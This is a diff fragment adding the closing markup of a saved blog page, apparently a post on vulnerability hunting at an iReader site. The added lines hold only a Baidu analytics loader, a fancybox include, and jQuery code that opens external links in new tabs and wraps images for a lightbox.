+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./掌阅iReader某站Python漏洞挖掘  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
